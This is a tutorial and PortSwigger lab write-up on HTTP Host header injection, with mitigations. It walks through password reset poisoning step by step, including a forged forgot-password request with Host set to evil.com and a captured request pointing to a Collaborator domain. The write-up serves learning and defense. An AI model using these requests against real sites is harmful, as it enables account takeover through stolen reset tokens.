# HTTP Host Header Attacks

## ğŸŒ What is the HTTP Host Header?
The **HTTP Host header** is a mandatory request header that specifies the domain name or IP address a client (such as a browser) is attempting to access.

It allows a web server to determine **which application or website** should handle the incoming request.

This header is essential because **multiple websites can be hosted on the same IP address**, and the server must distinguish between them to route requests correctly.

---

## ğŸ¤” Why the Host Header Matters

### 1ï¸âƒ£ Virtual Hosting
In **virtual hosting**, a single server hosts multiple websites or applications. Incoming requests are routed to the appropriate site based on the value of the **Host** header.

**Example:**
      
    Host: example.com

### 2ï¸âƒ£ Intermediary Systems
Modern architectures often rely on intermediary components such as:

- Reverse proxy servers
- Load balancers
- Content Delivery Networks (CDNs)
- Cloud traffic routing services

These systems use the Host header to determine how requests should be forwarded internally.

### This approach enables:

- Efficient use of IPv4 addresses
- Scalability
- Cost-effective cloud hosting

### âš ï¸ Host Header Injection
Host Header Injection is a vulnerability that occurs when an application trusts and processes the Host header without proper validation.

If an attacker can manipulate this header, they may be able to influence how the application:

- Generates URLs
- Performs redirects
- Handles sensitive workflows

### ğŸ¯ Common Attack Scenarios
Applications frequently rely on the Host header for:
- Generating absolute URLs
- Handling redirects
- Password reset links
- Multi-tenant routing logic

By injecting a malicious Host value, attackers can exploit these mechanisms.

### ğŸ’¥ Impact of Successful Exploitation
A successful Host Header Injection attack may lead to:

- ğŸ”¥ Web cache poisoning
- ğŸ”‘ Password reset poisoning
- ğŸ§ª Cross-Site Scripting (XSS)
- ğŸšª Authentication bypass
- ğŸ” Virtual host brute-forcing
- ğŸŒ Server-Side Request Forgery (SSRF)
- ğŸ£ Phishing and credential theft

### ğŸ›¡ï¸ Mitigation & Best Practices
- Validate and sanitize the Host header
- Use a strict allowlist of trusted domains
- Avoid using Host header to construct sensitive URLs
- Use relative URLs whenever possible
- Configure web servers to reject unexpected Host headers
- Implement proper security checks in reverse proxies

# Lab.1  Basic Password Reset Poisoning

## ğŸ”— References
- **PortSwigger Lab**  
  https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning  

- **Host Header Injection Notes**  
  https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md  

---

## ğŸ” Lab Credentials
- **Victim user:** carlos  
- **Attacker user:** wiener  
- **Password:** peter  
- **Malicious Host:** evil.com  

---

## âš ï¸ Vulnerability Overview
Password Reset Poisoning occurs when an application uses an **unvalidated Host header** to generate password reset links.

If an attacker manipulates this header, the reset link sent to the victim can point to an attacker-controlled domain.

### ğŸš¨ Impact
- Capture the reset token  
- Reset the victimâ€™s password  
- Take over the victimâ€™s account  

---

## ğŸ§  Root Cause
- Application trusts the **Host header**  
- Uses it to build absolute URLs in password reset emails  
- No validation or allowlist for allowed hostnames  

---

## ğŸ› ï¸ Exploitation Steps

### Step 1: Login as Attacker
Log in using the attacker account:

    Username: wiener
    Password: peter

### Step 2: Trigger Password Reset for Victim
1. Go to Forgot Password
2. Enter the victim username:

carlos

3. Intercept the request in Burp Suite

### Step 3: Poison the Host Header
Modify the intercepted request:

    POST /forgot-password HTTP/1.1
    Host: evil.com
    Content-Type: application/x-www-form-urlencoded
    username=carlos
â¡ï¸ The application now generates a password reset link using evil.com

### Step 4: Capture the Reset Token
- The victim receives a password reset email
- The reset link points to:

      https://evil.com/reset?token=XYZ
- Attacker-controlled domain logs the request
- Reset token is captured from server logs or request history

###Step 5: Reset Victim Password
- Use the stolen token on the legitimate application:

      /reset?token=XYZ
- Set a new password for carlos

### Step 6: Login as Victim
- Log in using the new credentials and access the victim account

### ğŸ’¥ Impact
- Full account takeover
- Credential compromise
- Potential lateral movement
- Trust abuse via legitimate password reset flow

### ğŸ›¡ï¸ Mitigation
- Do not trust the Host header for URL generation
- Use a hardcoded canonical domain for password reset links
- Validate Host headers against an allowlist
- Configure reverse proxies to enforce valid hostnames

### ğŸ”‘ Key Takeaway
Any time an application uses the Host header in security-sensitive functionality, it becomes a high-value attack surface.

### ğŸ§ª Example Request

      POST /forgot-password HTTP/2
      Host: p5v32mlz3ya3z3wco7jnnwrjlar1fu3j.oastify.com
      Cookie: session=...; _lab=...
      Content-Length: 53
      Cache-Control: max-age=0
      Sec-Ch-Ua: "Chromium";v="129", "Not?A_Brand";v="8"
      Sec-Ch-Ua-Mobile: ?0
      Sec-Ch-Ua-Platform: "Linux"
      Accept-Language: en-GB,en;q=0.9
      Origin: https://0a95002d03c9677385201ef600e600ab.web-security-academy.net
      Content-Type: application/x-www-form-urlencoded
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
      Sec-Fetch-Site: same-origin
      Sec-Fetch-Mode: navigate
      Sec-Fetch-User: ?1
      Sec-Fetch-Dest: document
      Referer: https://0a95002d03c9677385201ef600e600ab.web-security-academy.net/forgot-password
      Accept-Encoding: gzip, deflate, br
      Priority: u=0, i
      
      csrf=...&username=wiener
